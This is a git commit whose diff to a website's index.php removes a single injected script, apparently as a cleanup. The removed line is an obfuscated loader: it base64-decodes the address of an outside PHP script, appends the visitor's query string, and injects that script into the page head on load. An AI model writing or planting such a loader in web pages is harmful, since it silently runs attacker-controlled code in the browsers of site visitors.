dfcf054f4ad463f2b0a40c257ceadeb95982aed2
bharti-14 <huttondavid3673@gmail.com>
2026-07-17 17:51:07 +0530

    Update index.php

--- index.php
+++ index.php
@@ -48,7 +48,6 @@ hs.src = ('//s10.histats.com/js15_as.js');
 </head>
 
 <body>
-<script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9icmlnaHRwYXRoY2xlYW5pbmdjby5zaXRlL2hiOHA1ai5waHA=");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>
     <div class="container-xxl bg-white p-0">
         <!-- Spinner Start -->
         <div id="spinner" class="show bg-white position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
